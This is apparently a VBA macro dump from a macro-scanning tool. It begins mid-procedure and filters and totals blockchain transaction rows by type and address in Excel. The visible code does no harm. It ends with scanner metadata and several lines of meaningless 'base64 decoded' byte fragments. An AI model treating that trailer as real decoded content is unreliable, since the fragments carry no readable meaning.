Rows("1:2").Select
Selection.Delete Shift:=xlUp

'fix names of tx type
Cells.Replace What:="(smart ", Replacement:="(smart_", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False
Cells.Replace What:="(invoke ", Replacement:="(invoke_", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False

Columns("A:A").Select
Selection.TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, _
    TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=True, Tab:=False, _
    Semicolon:=False, Comma:=False, Space:=True, Other:=False, FieldInfo _
    :=Array(Array(1, 1), Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), _
    Array(7, 1), Array(8, 1), Array(9, 1), Array(10, 1), Array(11, 1), Array(12, 1)), _
    TrailingMinusNumbers:=True

Columns("I:L").Select
Selection.Delete Shift:=xlToLeft

Columns("A:H").Select
Selection.Columns.AutoFit

With Application
    .DecimalSeparator = "."
    .UseSystemSeparators = False
End With

Columns("H:H").Select
Selection.NumberFormat = "0.00000000"

'delete all tx except input
txtype = InputBox("Enter tx type to analise" _
& vbNewLine _
& vbNewLine & "0 = (fees)" _
& vbNewLine & "1 = (genesis)" _
& vbNewLine & "2 = (payment)" _
& vbNewLine & "3 = (issue)" _
& vbNewLine & "4 = (transfer)" _
& vbNewLine & "5 = (reissue)" _
& vbNewLine & "6 = (burn)" _
& vbNewLine & "7 = (exchange)" _
& vbNewLine & "8 = (lease)" _
& vbNewLine & "9 = (unlease)" _
& vbNewLine & "10 = (alias)" _
& vbNewLine & "11 = (mass)" _
& vbNewLine & "12 = (data)" _
& vbNewLine & "13 = (smart_account)" _
& vbNewLine & "14 = (sponsorship)" _
& vbNewLine & "141 = (sponsor)" _
& vbNewLine & "15 = (smart_asset)" _
& vbNewLine & "16 = (invoke)" _
& vbNewLine & "161 = (invoke_transfer)" _
& vbNewLine & "162 = (invoke_data)" _
, "tx filter", "7")

Select Case txtype
    Case 0
        txtype = "(fees)"
    Case 1
        txtype = "(genesis)"
    Case 2
        txtype = "(payment)"
    Case 3
        txtype = "(issue)"
    Case 4
        txtype = "(transfer)"
    Case 5
        txtype = "(reissue)"
    Case 6
        txtype = "(burn)"
    Case 7
        txtype = "(exchange)"
    Case 8
        txtype = "(lease)"
    Case 9
        txtype = "(unlease)"
    Case 10
        txtype = "(alias)"
    Case 11
        txtype = "(mass)"
    Case 12
        txtype = "(data)"
    Case 13
        txtype = "(smart_account)"
    Case 14
        txtype = "(sponsorship)"
    Case 141
        txtype = "(sponsor)"
    Case 15
        txtype = "(smart_asset)"
    Case 16
        txtype = "(invoke)"
    Case 161
        txtype = "(invoke_transfer)"
    Case 162
        txtype = "(invoke_data)"
    Case Else
        txtype = "(" & txtype & ")"
End Select

Set s = Columns("D:D").Find(txtype)
If s Is Nothing Then
    Columns("A:I").Select
    Selection.ClearContents
    ActiveSheet.name = txtype
    k = 0: n = 0: tsumm = 0
    GoTo NothingFinded
End If

n = Cells(Rows.count, 4).End(xlUp).Row
For i = 1 To n
Repeat:
    If Cells(i, 4).Value <> "" And Cells(i, 4).Value <> txtype Then
        Rows(i & ":" & i).Select
        Selection.Delete Shift:=xlUp
        GoTo Repeat
    End If
    If Cells(i, 5).Value <> mainA And Cells(i, 7).Value = mainA Then
        s = Cells(i, 5).Value
        Cells(i, 5).Value = Cells(i, 7).Value
        Cells(i, 7).Value = s
        Cells(i, 6).Value = "<-"
    End If
Next
    
'sorting by addresses
Columns("A:H").Select
Selection.Sort Key1:=Range("G1"), Order1:=xlAscending, Key2:=Range("H1") _
, Order2:=xlAscending, Header:=xlGuess, OrderCustom:=1, MatchCase:=False _
, Orientation:=xlTopToBottom, DataOption1:=xlSortNormal, DataOption2 _
:=xlSortTextAsNumbers
        
'check the 1st raw
If Cells(1, 7).Value = "" Then
    n = 0
    GoTo NothingFinded
Else
    n = Cells(Rows.count, 7).End(xlUp).Row
End If

summ = Cells(1, 8).Value
tsumm = summ
na = 1
k = 1
If Cells(2, 7).Value <> Cells(1, 7).Value Then
    Cells(k, 9).Value = na
    Cells(k, 10).Value = Cells(1, 7).Value
    Cells(k, 11).Value = Fix(summ)
    Cells(k, 12).Value = summ - Fix(summ)
End If
GoSub randomColor
Cells(1, 7).Interior.color = RGB(r, g, B)

'check the other raws
For i = 2 To n
    prevA = Cells(i - 1, 7).Value
    currA = Cells(i, 7).Value
    nextA = Cells(i + 1, 7).Value
    If currA = prevA Then
        summ = summ + Cells(i, 8).Value
        na = na + 1
        Cells(i, 7).Interior.color = RGB(r, g, B)
    Else
        summ = Cells(i, 8).Value
        na = 1
        GoSub randomColor
        Cells(i, 7).Interior.color = RGB(r, g, B)
    End If
    If nextA <> currA Then
        k = k + 1
        Cells(k, 9).Value = na
        'if not address and not alias
        If Left(currA, 2) <> "3P" And Asc(Left(currA, 1)) < 91 Then
            Cells(k, 10).Value = currA & " " & summ
            tsumm = tsumm - summ
        Else
            Cells(k, 10).Value = currA
            Cells(k, 11).Value = Fix(summ)
            Cells(k, 12).Value = summ - Fix(summ)
        End If
    End If
    tsumm = tsumm + Cells(i, 8).Value
Next

'sorting by size
Columns("I:L").Select
Selection.Sort Key1:=Range("K1"), Order1:=xlAscending, Header:=xlGuess, OrderCustom:=1 _
, MatchCase:=False, Orientation:=xlTopToBottom, DataOption1:=xlSortTextAsNumbers

NothingFinded:
Cells(k + 2, 10).Value = "total addresses"
Cells(k + 2, 11).Value = "total summ"
Cells(k + 3, 10).Value = k
Cells(k + 3, 11).Value = Fix(tsumm)
Cells(k + 3, 12).Value = tsumm - Fix(tsumm)
Cells(k + 5, 10).Value = "total tx " & txtype
Cells(k + 6, 10).Value = n
Columns("A:Z").Select
Selection.Columns.AutoFit
Range("K" & k + 2 & ":" & "L" & k + 2).Select
Selection.Merge
 
Application.UseSystemSeparators = True

Exit Sub

randomColor:
    r = WorksheetFunction.RandBetween(150, 255)
    g = WorksheetFunction.RandBetween(150, 255)
    B = WorksheetFunction.RandBetween(150, 255)
Return

End Sub



Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' kz+,
' @S<8
' YQABUVYJ
' E*GV
' R13("/
' ?J^V6
' V9PW
' _" ?#=

INQUEST-PP=macro
